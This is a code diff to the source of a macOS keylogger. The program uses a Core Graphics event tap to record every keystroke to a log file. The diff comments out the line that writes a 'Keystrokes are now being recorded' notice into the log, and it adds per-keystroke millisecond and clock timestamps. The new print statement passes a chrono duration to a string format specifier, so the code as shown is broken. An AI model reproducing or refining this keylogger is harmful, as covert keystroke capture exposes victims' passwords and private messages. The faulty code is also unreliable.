@@ -1,5 +1,7 @@
 #include "keylogger.h"
 
+using namespace std::chrono;
+
 int main(int argc, const char *argv[]) {
 
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
@@ -35,8 +37,8 @@ int main(int argc, const char *argv[]) {
         exit(1);
     }
 
-    fprintf(logfile, "\n\nKeystrokes are now being recorded\n%s\n", asctime(localtime(&result)));
-    fflush(logfile);
+//    fprintf(logfile, "\n\nKeystrokes are now being recorded\n%s\n", asctime(localtime(&result)));
+//    fflush(logfile);
 
     printf("Logging to: %s\n", logfileLocation);
     fflush(stdout);
@@ -50,8 +52,12 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    milliseconds ms = duration_cast< milliseconds >(
+        system_clock::now().time_since_epoch()
+    );
+    time_t result = time(NULL);
     // This prints the readable key into the log
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%s %s %s\n", convertKeyCode(keyCode), ms, asctime(localtime(&result)));
     fflush(logfile);
 
     return event;
